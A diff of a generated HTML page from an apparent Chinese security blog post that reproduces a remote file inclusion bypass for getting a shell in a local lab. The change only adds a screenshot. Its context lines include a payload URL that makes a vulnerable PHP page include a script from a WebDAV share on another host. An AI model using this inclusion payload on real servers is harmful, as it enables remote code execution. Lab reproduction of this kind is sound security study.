@@ -22,7 +22,8 @@
 <meta property="og:image" content="https://s2.ax1x.com/2019/05/31/VlhxnU.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/05/31/Vlqpfe.md.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/05/31/VlqAmt.md.png">
-<meta property="og:updated_time" content="2019-05-31T12:46:30.223Z">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/31/VlLxRe.md.png">
+<meta property="og:updated_time" content="2019-05-31T12:48:53.082Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="RFI绕过限制getshell复现">
 <meta name="twitter:description" content="操作的来源在搜东西的时候翻到某篇文章，“RFI绕过限制getshell”。看到了一波奇淫技巧，就复现了一波原文链接：RFI绕过URL包含限制getshell  由于原文有限制，限制如下：12smb只适用于内网windows特性才能直接访问smb 之后我在群里看见某位老哥发了张图：（使用Apache搭建webav也行） 复现操作smb绕过环境：12windows：phpstudyLinux：samb">
@@ -172,7 +173,7 @@
 <p>搭建好之后在Linux的文件管理器中输入dav://127.0.0.1/webdav可以看见如下图就代表成功了<br><img src="https://s2.ax1x.com/2019/05/31/Vlqpfe.md.png" alt=""></p>
 <p>执行以下payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/rfi/rfi.php?file=//192.168.241.132//webdav/demo.php</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://s2.ax1x.com/2019/05/31/VlqAmt.md.png" alt=""></p>
-<h2 id="文件包含漏洞总结"><a href="#文件包含漏洞总结" class="headerlink" title="文件包含漏洞总结"></a>文件包含漏洞总结</h2><p>如图：</p>
+<h2 id="文件包含漏洞总结"><a href="#文件包含漏洞总结" class="headerlink" title="文件包含漏洞总结"></a>文件包含漏洞总结</h2><p>如图：<br><img src="https://s2.ax1x.com/2019/05/31/VlLxRe.md.png" alt=""></p>
 
   </div>
 </article>
